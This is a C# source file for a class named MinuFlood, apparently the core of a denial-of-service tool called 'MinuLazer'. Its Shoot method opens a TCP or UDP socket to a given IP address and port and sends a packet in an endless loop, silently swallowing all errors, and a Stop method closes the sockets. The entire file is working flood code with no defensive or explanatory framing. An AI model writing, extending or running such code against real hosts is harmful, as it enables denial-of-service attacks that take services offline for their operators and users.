using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace MinuLazer.Functions
{
    public class MinuFlood
    {
        private Socket tcp;
        private Socket udp;
        private static bool connect = false;

        public void Shoot(string ip, int port, byte[] packet, int method)
        {
            try
            {
                Method methods = new Method();
                IPEndPoint ipep = new IPEndPoint(IPAddress.Parse(ip), port);

                tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                udp = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

                if (method == methods.METHOD_UDP)
                {
                    while (true)
                    {
                        udp.SendTo(packet, ipep);
                        connect = true;
                    }
                }

                else if (method == methods.METHOD_TCP)
                {
                    tcp.Connect(ipep);

                    while (true)
                    {
                        tcp.Send(packet, SocketFlags.None);
                        connect = true;
                    }
                }
            }

            catch { }
        }

        public void Stop()
        {
            if (connect == true)
            {
                udp.Close();
                tcp.Close();
            }
        }
    }
}